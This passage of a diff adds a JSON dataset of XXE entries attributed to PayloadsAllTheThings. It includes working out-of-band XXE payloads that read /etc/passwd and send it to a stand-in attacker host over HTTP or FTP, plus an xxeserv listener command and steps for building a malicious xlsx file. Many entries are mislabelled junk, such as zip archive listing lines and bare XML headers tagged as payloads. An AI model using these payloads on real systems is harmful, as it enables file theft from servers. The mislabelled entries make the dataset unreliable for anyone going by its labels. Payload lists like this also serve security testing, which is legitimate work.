+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "2021-10-17 15:19:00 .....          578          223  _rels/.rels",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "2021-10-17 15:19:00 .....          887          508  xl/workbook.xml",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "2021-10-17 15:19:00 .....         4451          643  xl/styles.xml",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "2021-10-17 15:19:00 .....         2042          899  xl/worksheets/sheet1.xml",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "2021-10-17 15:19:00 .....          549          210  xl/_rels/workbook.xml.rels",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "2021-10-17 15:19:00 .....          201          160  xl/sharedStrings.xml",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "2021-10-17 15:19:00 .....          731          352  docProps/core.xml",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "2021-10-17 15:19:00 .....          410          246  docProps/app.xml",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "2021-10-17 15:19:00 .....         1367          345  [Content_Types].xml",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "2021-10-17 15:19:00              11216         3586  9 files",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "cd XXE",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "zip -r -u ../xxe.xlsx *",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM \"http://10.10.10.10:8000/xxe.dtd\">%asd;%c;]>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<cdl>&rrr;</cdl>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<workbook xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM \"http://10.10.10.10:8000/xxe.dtd\">%asd;%c;]>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<sst xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" count=\"10\" uniqueCount=\"10\"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % d SYSTEM \"file:///etc/passwd\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % c \"<!ENTITY rrr SYSTEM 'ftp://10.10.10.10:2121/%d;'>\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "xxeserv -o files.log -p 2121 -w -wd public -wp 8000",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!-- Load the contents of a sensitive file into a variable -->",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % payload SYSTEM \"file:///etc/passwd\">",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!-- Use that variable to construct an HTTP get request with the file contents in the URL -->",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM \"http://[ATTACKER.DOMAIN.TLD]/x=%payload;\">'>",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      },
+      {
+        "payload": "%external;",
+        "category": "xxe",
+        "source": "PayloadsAllTheThings",
+        "confidence": 0.75,
+        "description": "xxe payload from documentation",
+        "tags": [
+          "xxe"
+        ]
+      }
+    ]
+  }
+}
